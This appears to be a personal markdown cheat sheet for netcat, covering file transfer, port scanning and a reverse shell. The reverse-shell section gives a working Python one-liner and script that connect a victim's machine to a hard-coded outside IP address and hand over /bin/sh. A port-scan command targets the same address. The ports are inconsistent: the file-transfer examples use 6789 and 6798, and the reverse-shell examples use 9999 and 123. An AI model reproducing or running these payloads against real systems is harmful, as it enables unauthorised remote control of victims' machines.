# Netcat
general network debugging tool, supports tcp udp

# usage examples

## receiving files

the l flag is for listen
``` shell
nc -l 6789 > file.txt
```

## sending a file
```shell
nc receiving_host 6798 < file_to_send
```

## setting up a reverse shell on a client

```A reverse shell``` is the redirection of the output/input streams of a shell to a distant machine  
**In the atacker's machine** listen to connections on a given port 
```sh
nc -l 9999
```
**On the victims machine**  redirect a root shell i/o streams to the attacker's machine ip:port using a c or python program
```sh
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("178.79.152.114",123));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

```

```python
### for readability, the command in a script
#!/usr/bin/python3 python3

import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("178.79.152.114",9999))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
```

## Port scanning
```sh
nc -z -v 178.79.152.114 1-100
```
- -z try to connect to ports passed in params  
- -v verbose
- 1-100 range of ports to try